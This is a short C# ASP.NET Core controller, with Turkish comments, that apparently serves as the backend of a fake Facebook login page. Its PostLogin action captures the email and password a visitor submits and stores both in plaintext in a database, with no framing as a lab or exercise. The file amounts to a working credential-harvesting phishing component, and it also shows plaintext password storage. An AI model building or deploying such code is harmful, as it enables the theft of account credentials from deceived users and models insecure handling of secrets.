
 using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using WebApplicationProject.Models;


namespace WebApplicationProject.Controllers
    {
        public class FacebookLoginController : Controller
        {
            private readonly WebDatabaseContext _context;
            private readonly ILogger<FacebookLoginController> _logger;

            public FacebookLoginController(WebDatabaseContext context, ILogger<FacebookLoginController> logger)
            {
                _context = context;
                _logger = logger;
            }
        public IActionResult Index()
        {
            return View("~/Views/FacebookLogin/FacebookLogin.cshtml");
        }


            [HttpPost]
            [ValidateAntiForgeryToken]
            public async Task<IActionResult> PostLogin(string Email, string Password)
            {
                if (!string.IsNullOrEmpty(Email) && !string.IsNullOrEmpty(Password))
                {
                    // Veritabanına ekleme işlemi
                    var facebookLogin = new FacebookLogin
                    {
                        Email = Email, // Örnek olarak fname'i Email alanına atadım
                        Password = Password // Örnek olarak lname'i Password alanına atadım
                    };

                    _context.Add(facebookLogin);
                    await _context.SaveChangesAsync();
                     return View("Index");
            }

            return BadRequest(); // Hata durumunda bad request dönebilirsiniz
            }

        }
    }

